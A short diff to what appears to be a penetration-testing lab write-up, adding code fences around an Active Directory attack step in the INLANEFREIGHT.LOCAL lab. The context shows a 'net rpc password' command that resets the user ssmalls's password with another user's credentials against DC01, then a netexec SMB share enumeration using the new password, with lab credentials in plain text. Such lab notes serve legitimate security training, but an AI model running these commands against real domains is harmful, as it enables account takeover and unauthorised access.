@@ -1625,6 +1625,9 @@ INFO: Compressing output into 20261113132230_bloodhound.zip
 
 ```bash
 net rpc password "ssmalls" 'Password123!' -U "INLANEFREIGHT.LOCAL"/"hporter"%'Gr8hambino!' -S DC01 
+```
+
+```
                                                                                                                                                                                                                                     
 ┌──(kali㉿kali)-[~/labs/aen]
 └─$ nxc smb 172.16.8.3 -u 'ssmalls' -p 'Password123!' --shares                                        
